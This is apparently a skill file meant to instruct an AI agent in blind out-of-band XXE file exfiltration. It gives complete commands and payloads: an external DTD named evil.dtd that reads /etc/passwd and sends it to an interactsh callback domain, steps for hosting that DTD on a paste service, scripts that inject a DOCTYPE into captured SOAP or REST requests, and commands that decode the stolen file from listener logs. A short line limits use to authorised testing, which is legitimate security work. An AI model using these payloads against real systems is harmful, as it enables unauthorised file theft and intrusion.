---
name: blind-xxe-testing
description: Use when exfiltrating a file from a target via blind or out-of-band XXE (XML External Entity injection) — reading /etc/passwd or any server-side file through an out-of-band callback when the response shows nothing. Covers SOAP/WCF, REST, SAML, file uploads, interactsh/oast listeners, external-DTD file read, and diagnosing blocked exfiltration. Triggers on "XXE", "blind XXE", "XML external entity", "DTD", "out-of-band", "interactsh", "oast", "external entity", "exfiltrate file", "read /etc/passwd".
---

# Blind XXE File Exfiltration

Read a file off a target that shows no error and reflects nothing. The only
signal is an outbound request you control.

**The oracle is an out-of-band callback, never the HTTP response.** The response
is never parsed to reach a verdict, so unfamiliar response shapes don't matter.
If you're diffing response bodies, you're off the method.

Two terminals: A runs the listener, B does everything else.

## 1. Get a request that already works

Do this first — a malformed baseline is the top cause of false negatives.

```bash
curl -sk -i "$URL" -H 'Content-Type: text/xml' -H 'SOAPAction: ...' --data-binary @req.xml
```

`400` = malformed, `401/403` = missing auth, `404` = wrong path. Fix it before
injecting anything.

If you have a Burp raw capture, convert it to curl flags once:

```bash
python3 - captured.txt <<'PY' > /tmp/curlargs.sh
import shlex
t = open('captured.txt').read().replace('\r\n', '\n')
head, _, body = t.partition('\n\n')
lines = head.split('\n')
print("METHOD=%s" % shlex.quote(lines[0].split()[0]))
for l in lines[1:]:
    if ':' in l:
        k, v = l.split(':', 1)
        print("HDR+=(%s)" % shlex.quote(k.strip() + ':' + v.strip()))
open('/tmp/body.bin', 'w').write(body)
PY
source /tmp/curlargs.sh
curl -s -X "$METHOD" "${HDR[@]}" --data-binary @/tmp/body.bin "$URL"
```

## 2. Start the listener

Terminal A. **`-v` is mandatory** — without it interactsh prints no request path,
and the path is where the file lands.

```bash
interactsh-client -n 1 -v 2>&1 | tee /tmp/oast.log
```

Note the domain it prints, e.g. `abc123xyz.oast.live`. That's `DOMAIN` below.

## 3. Exfiltrate the file

Three steps. `DOMAIN` is your listener; the DTD is hosted somewhere else.

```bash
# a) the DTD. &#x25; is '%' -- required because a parameter entity is nested
#    inside another entity's value.
cat >/tmp/evil.dtd <<XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://DOMAIN/?d=%file;'>">
%eval;
%ex;
XML

# b) host it where the TARGET can fetch it. paste.rs serves raw text, no account.
DTDURL=$(curl -s -X POST --data-binary @/tmp/evil.dtd https://paste.rs)

# c) point a DOCTYPE at it. No &entity; needed in the body -- an external DTD
#    is fetched during parse whether or not anything references it.
cat >/tmp/inject.xml <<XML
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "$DTDURL">
<order><customer>x</customer></order>
XML

# d) send
curl -s -X POST "$URL" -H 'Content-Type: text/xml' --data-binary @/tmp/inject.xml
```

Injecting into a real captured body instead:

```bash
python3 - "$DTDURL" <<'PY' > /tmp/inject.xml
import re, sys
t = open('req.xml').read()
t = re.sub(r'(<\?xml[^>]*\?>)',
           lambda m: m.group(1) + '\n<!DOCTYPE r SYSTEM "%s">' % sys.argv[1],
           t, count=1)
print(t)
PY
```

Changing the target file is a one-word edit in the DTD.

## 4. Decode

```bash
grep -oE 'GET /\?d=\S+' /tmp/oast.log | tail -1 \
  | sed 's#^GET /?d=##' \
  | python3 -c 'import sys, urllib.parse; sys.stdout.write(urllib.parse.unquote_plus(sys.stdin.read().strip()))'
```

A callback carrying plausible `root:x:0:0:...` lines means arbitrary file read
is proven.

## When it fails

| Symptom | Cause | Fix |
|---|---|---|
| DTD fetched, no `?d=` | inline parameter entities blocked by the stack | external DTD is the working path; if hosting is impossible, put the DTD in the internal subset — but treat silence as inconclusive |
| nothing at all | DTD host unreachable from the target | self-host and use that URL; the target may have an egress allowlist |
| truncated / empty, small file | URL length limit | read a smaller file, or exfil in parts |
| HTML comes back | intercepting proxy in the path | not a file read; fix the proxy |
| `Unexpected end of file` / 400 | malformed payload | re-verify the baseline; a parser error is not a negative result |

**Detection vs exfiltration, if you want to confirm the vuln separately:**

```xml
<!DOCTYPE r [ <!ENTITY x0 SYSTEM "http://DOMAIN/probe"> ]>   <!-- body entity -->
<!DOCTYPE r SYSTEM "http://DOMAIN/probe.dtd">                 <!-- external DTD -->
```

A callback on either confirms it. A negative body-entity probe is **not** a clean
bill of health — stacks that block body entities often still load external DTDs,
which is why the DTD route is the primary approach above.

## Gotchas

**Public interactsh servers do not support `-fl` file hosting** — the flag fails
with `did not advertise file hosting`. That's why the DTD goes to a paste service.

**Never hand-build `Content-Length`.** Mutate the body after headers and a stale
length truncates the XML mid-token, producing a parser error indistinguishable
from "not vulnerable". Let `curl --data-binary` / `-F` handle it.

**SOAP namespaces are load-bearing.** `Unexpected end of file` on a valid-looking
envelope is usually namespace trouble — a prefixed element often works where a
default namespace fails. Re-fetch the WSDL and match literally.

**Don't mistake a whitelist for the sink.** An endpoint that answers for known
names and rejects everything else looks like SSRF. Map it first:

| Input | Result | Meaning |
|---|---|---|
| `Keycloak` | `BadGateway` | matched, upstream down |
| `keycloak` | `BadGateway` | case-insensitive |
| `Keycloak@evil.com` | rejected | exact match, not substring |
| `8.8.8.8` | rejected | not a bare-IP sink |

Case-insensitive **and** exact means no injection through that parameter — look
for XXE or another sink.

## Confirm before reporting

- a captured OAST request line,
- originating from the **target's** IP, not yours,
- decoded content plausible for that file.

## Scope

Only systems you're authorised to test. Read `/etc/hostname` or
`/etc/os-release` before `/etc/passwd` — they prove arbitrary read without
exposing anything.

## Reference

`references/payloads.md` — DTD anatomy, per-vector DOCTYPE delivery (upload,
SAML, OOXML, headers), DTD hosting options, fallbacks when bulk exfil is blocked,
and per-stack notes.

